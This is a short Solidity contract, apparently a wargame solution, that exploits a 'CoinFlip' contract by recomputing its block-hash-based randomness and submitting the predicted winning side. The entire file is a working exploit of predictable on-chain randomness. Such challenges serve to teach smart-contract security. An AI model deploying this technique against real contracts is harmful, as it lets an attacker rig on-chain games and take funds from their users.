// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "./CoinFlip.sol";

contract CoinFlipHack {
    uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public immutable coinFlip;

    constructor(address _coinFlip) {
        coinFlip = CoinFlip(_coinFlip);
    }

    function flipAttack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlipDiv = blockValue / FACTOR;
        bool side = coinFlipDiv == 1 ? true : false;

        require(coinFlip.flip(side), "wtf");
    }
}
